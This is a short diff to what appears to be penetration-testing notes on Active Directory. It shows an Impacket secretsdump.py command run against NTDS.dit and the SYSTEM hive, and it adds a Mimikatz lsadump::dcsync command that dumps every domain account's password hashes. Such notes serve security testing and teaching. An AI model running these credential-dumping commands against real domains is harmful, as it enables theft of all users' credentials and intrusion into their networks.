@@ -104,3 +104,7 @@ Back up AD files:
 Then locally extract NTDS.dit and SYSTEM registry data using Impacket script secretsdump.py  
 
     $ python secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL        
+
+Or use Mimikatz to extract hashes from NTDS.dit    
+
+mimikatz # lsadump::dcsync /domain:domain.local /all /csv          
